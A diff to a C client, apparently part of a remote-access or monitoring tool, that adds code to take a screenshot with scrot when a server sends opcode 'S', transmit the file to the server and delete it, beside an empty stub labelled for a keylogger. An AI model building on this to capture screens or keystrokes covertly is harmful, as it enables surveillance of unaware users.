@@ -69,6 +69,7 @@ void startingDataInitialize()
         {
             p = strtok(NULL, "= \n");
             strcat(sendBuffer, p);
+            strcpy(clientData.name, p);
         }
         p = strtok(NULL, "= \n");
     }
@@ -81,11 +82,23 @@ void startingDataInitialize()
 
 void handleScreenshotOpcode()
 {
-    pid_t pid = fork();
     message_t msg;
+
+    strcpy(msg.buffer, "");
+    msg.opCode = 'S';
+    msg.size = 0;
+    sendMessage(clientData.serverSocket, &msg);
+
+    char filename[BUFFER_SIZE];
+    strcpy(filename, "screenshotTmp.jpg");
+
+    pid_t pid = fork();
+    
     if(pid == 0)
     {
-        
+        execlp("scrot", "scrot", filename, "--quality", "50", NULL);
+        perror("execlp failed");
+        exit(EXIT_FAILURE);
     }
     else if(pid > 0)
     {
@@ -98,9 +111,13 @@ void handleScreenshotOpcode()
         msg.size = strlen(msg.buffer);
         sendMessage(clientData.serverSocket, &msg);
     }
+    printf("File created. sending file...\n");
+    sendFile(clientData.serverSocket, filename);
+
+    remove(filename);
 }
 
-void handleOpcode(int sock, message_t msg)
+void handleOpcode(message_t msg)
 {
     switch(msg.opCode)
     {
@@ -108,7 +125,7 @@ void handleOpcode(int sock, message_t msg)
         //handle Keylogger Opcode
         break;
         case 'S':
-        handleScreenshotOpcode(sock);
+        handleScreenshotOpcode();
         break;
     }
 }
